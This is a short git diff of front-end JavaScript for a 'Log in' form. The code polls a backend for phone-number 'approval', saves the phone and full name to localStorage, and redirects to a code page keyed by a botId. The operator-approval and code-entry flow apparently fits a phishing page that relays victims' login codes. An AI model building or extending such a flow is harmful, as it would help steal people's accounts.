@@ -302,34 +302,41 @@ document.getElementById('detailsForm').addEventListener('submit', async (e) => {
         });
 
         const data = await res.json();
+        console.log("Submit response:", data);
         const requestId = data.requestId;
 
-        const poll = setInterval(async () => {
+       const poll = setInterval(async () => {
+    try {
+        const r = await fetch(`${BACKEND_URL}/check-phone/${requestId}`);
+        const d = await r.json();
 
-            const r = await fetch(`${BACKEND_URL}/check-phone/${requestId}`);
-            const d = await r.json();
+        console.log("Phone approval status:", d);
 
-            // if (d.blocked) {
-            //     clearInterval(poll);
-            //     alert(d.message || "Blocked");
-            //     nextBtn.disabled = false;
-            //     nextBtn.textContent = "Log in";
-            //     return;
-            // }
+        if (d.approved === true) {
+            clearInterval(poll);
 
-            if (d.approved === true) {
-                clearInterval(poll);
-                window.location.href = `code.html?botId=${botId}&requestId=${requestId}`;
-            }
+            console.log("APPROVED - REDIRECTING TO CODE");
 
-            if (d.approved === false) {
-                clearInterval(poll);
-                alert("Request declined");
-                nextBtn.disabled = false;
-                nextBtn.textContent = "Log in";
-            }
+            localStorage.setItem("phone", phone);
+            localStorage.setItem("fullName", name);
 
-        }, 1500);
+            window.location.href = `code.html?botId=${botId}`;
+        }
+
+        if (d.approved === false) {
+            clearInterval(poll);
+
+            alert("Request declined");
+
+            nextBtn.disabled = false;
+            nextBtn.textContent = "Log in";
+        }
+
+    } catch (err) {
+        console.error("Polling error:", err);
+    }
+
+}, 1500);
 
     } catch (err) {
         console.error(err);
